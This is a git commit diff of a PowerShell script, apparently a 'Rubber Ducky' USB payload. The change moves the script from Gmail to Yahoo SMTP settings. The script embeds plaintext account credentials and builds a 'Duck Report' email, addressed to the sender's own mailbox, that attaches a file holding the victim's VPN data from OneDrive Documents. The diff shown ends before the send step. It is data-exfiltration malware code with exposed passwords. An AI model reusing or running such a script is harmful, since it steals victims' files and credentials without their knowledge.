988613bd8e1745e5bacfe2b117256353770d8f64
Quentinq32 <100795382+Quentinq32@users.noreply.github.com>
2022-07-08 16:27:10 +0200

    Add files via upload

--- mail1.ps1
+++ mail1.ps1
@@ -1,10 +1,10 @@
-$SMTPServer = 'smtp.gmail.com'
+$SMTPServer = 'mail.yahoo.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ducky.rub@yahoo.com', 'Quentin8985!');
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'duckysys@gmail.com'
-$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.From = 'ducky.rub@yahoo.com'
+$ReportEmail.To.Add('ducky.rub@yahoo.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
 $files="$($env:USERPROFILE)\OneDrive\Documents\expressvpn.txt"
